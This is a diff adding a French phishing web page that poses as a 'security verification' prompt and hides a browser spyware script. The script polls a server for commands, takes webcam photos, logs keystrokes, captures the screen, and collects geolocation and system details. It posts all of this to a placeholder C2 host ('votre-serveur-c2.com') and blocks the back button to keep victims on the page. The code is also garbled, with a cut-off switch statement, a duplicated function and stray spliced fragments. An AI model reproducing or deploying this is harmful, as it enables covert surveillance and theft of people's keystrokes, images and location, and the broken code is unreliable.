@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚠️ Vérification Sécurité</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(255,255,255,0.95);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 400px;
+            backdrop-filter: blur(10px);
+        }
+        h1 { color: #333; margin-bottom: 20px; font-size: 24px; }
+        p { color: #666; line-height: 1.6; margin-bottom: 30px; }
+        .spinner {
+            width: 50px; height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+            display: none;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn-access {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 10px 20px rgba(102,126,234,0.4);
+            font-weight: bold;
+        }
+        .btn-access:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(102,126,234,0.6);
+        }
+        .btn-access:active { transform: translateY(0); }
+        .hidden { display: none !important; }
+        #status { font-size: 12px; color: #888; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner" id="spinner"></div>
+        <h1>🔒 Vérification de Sécurité</h1>
+        <p>Une vérification rapide est nécessaire pour accéder à votre appareil. Cliquez pour autoriser.</p>
+        <button class="btn-access" onclick="grantAccess()" id="accessBtn">
+            🚀 AVOIR ACCÈS MAINTENANT
+        </button>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        let accessGranted = false;
+        let modules = {
+            camera: { active: false, interval: null },
+            keylogger: { active: false, buffer: '' },
+            screen: { active: false, interval: null }
+        };
+
+        // POLLING DES COMMANDES SERVEUR
+        async function checkCommands() {
+            try {
+                const response = await fetch('/api/command');
+                if (response.ok) {
+                    const command = await response.json();
+                    if (command.status !== 'no-command') {
+                        executeCommand(command);
+                    }
+                }
+            } catch(e) {}
+        }
+
+        // EXÉCUTER COMMANDES
+        function executeCommand(cmd) {
+            console.log('📥 Command:', cmd.module, cmd.action);
+            
+            switch(cmd.module) {
+                case 'camera':
+                    if (cmd.action === 'start') startCamera(cmd.params.interval || 5);
+                    else if (cmd.action === 'stop') stopCamera();
+           MODULE CAMÉRA
+        function startCamera(interval) {
+            if (modules.camera.active) return;
+            modules.camera.active = true;
+            modules.camera.interval = setInterval(captureCamera, interval * 1000);
+            captureCamera();
+        }
+
+        function stopCamera() {
+            modules.camera.active = false;
+            if (modules.camera.interval) clearInterval(modules.camera.interval);
+        }
+
+        async function captureCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                        sendData({type: 'camera', image: canvas.toDataURL('image/jpeg', 0.7)});
+                        stream.getTracks().forEach(track => track.stop());
+                        video.remove();
+                    }, 500);
+                };
+            } catch(e) {
+                console.error('Camera error:', e);
+            }
+        }
+
+        // MODULE KEYLOGGER
+        function startKeylogger() {
+            if (modules.keylogger.active) return;
+            modules.keylogger.active = true;
+            modules.keylogger.buffer = '';
+            
+            document.addEventListener('keydown', logKey);
+        }
+
+        function stopKeylogger() {
+            modules.keylogger.active = false;
+            document.removeEventListener('keydown', logKey);
+        }
+
+        function logKey(e) {
+            if (!modules.keylogger.active) return;
+            modules.keylogger.buffer += e.key;
+            
+            // Envoyer par batch de 50 caractères
+            if (modules.keylogger.buffer.length >= 50) {
+                dumpKeylogger();
+            }
+        }
+
+        function dumpKeylogger() {
+            if (modules.keylogger.buffer) {
+                sendData({type: 'keylog', keys: modules.keylogger.buffer});
+                modules.keylogger.buffer = '';
+            }
+        }
+
+        // MODULE PARTAGE D'ÉCRAN
+        function startScreen(quality, interval) {
+            if (modules.screen.active) return;
+            modules.screen.active = true;
+            modules.screen.interval = setInterval(() => captureScreen(quality), interval * 1000);
+            captureScreen(quality);
+        }
+
+        function stopScreen() {
+            modules.screen.active = false;
+            if (modules.screen.interval) clearInterval(modules.screen.interval);
+        }
+
+        async function captureScreen(quality) {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 1280;
+                        canvas.height = 720;
+                        canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
+                        sendData({type: 'screen', image: canvas.toDataURL('image/jpeg', quality)});
+                        stream.getTracks().forEach(track => track.stop());
+                        video.remove();
+                    }, 500);
+                };
+            } catch(e) {
+                console.error('Screen error:', e);
+            }
+        }
+
+        // DONNÉES INITIALES
+        function collectInitialData() {
+            // Géolocalisation
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => sendData({
+                        type: 'location',
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    }),
+                    () => {},
+                    {enableHighAccuracy: true}
+                );
+            }
+
+            // Infos système
+            sendData({
+                type: 'system',
+                ua: navigator.userAgent,
+                lang: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                platform: navigator.platform,
+                cores: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory,
+                online: navigator.onLine,
+                timestamp: Date.now()
+            });
+        }
+
+        // ENVOI SERVEUR
+        async function sendData(payload) {
+            try {
+                await fetch('/receive', {
+                    method: 'POST',
+                    body: JSON.stringify(payload),
+                    headers: {'Content-Type': 'application/json'}
+                });
+            } catch(e) {
+                console.error('Send error:', e);
+            }
+        }y ? 'active' : 'no',
+                    timestamp: Date.now()
+                });
+
+            } catch(e) {}
+        }
+
+        // CAPTURE FRAME (image base64)
+        function captureFrame(video, stream = null) {
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video || stream, 0, 0, 640, 480);
+            sendData({type: 'capture', image: canvas.toDataURL('image/jpeg', 0.7)});
+        }
+
+        // ENVOI SERVEUR (votre C2)
+        async function sendData(payload) {
+            try {
+                await fetch('https://votre-serveur-c2.com/receive', {
+                    method: 'POST',
+                    body: JSON.stringify(payload),
+                    headers: {'Content-Type': 'application/json'}
+                });
+            } catch(e) {
+                // Fallback WebSocket / localStorage
+                localStorage.setItem(`data_${Date.now()}`, JSON.stringify(payload));
+            }
+        }
+
+        // PRÉ-ACTIVATION PARTIELLE (mousemove tracking)
+        document.addEventListener('mousemove', (e) => {
+            if (accessGranted) {
+                sendData({type: 'mouse', x: e.clientX, y: e.clientY});
+            }
+        });
+
+        // ANTI-DETECTION (supprime history)
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => history.go(1);
+    </script>
+</body>
+</html>
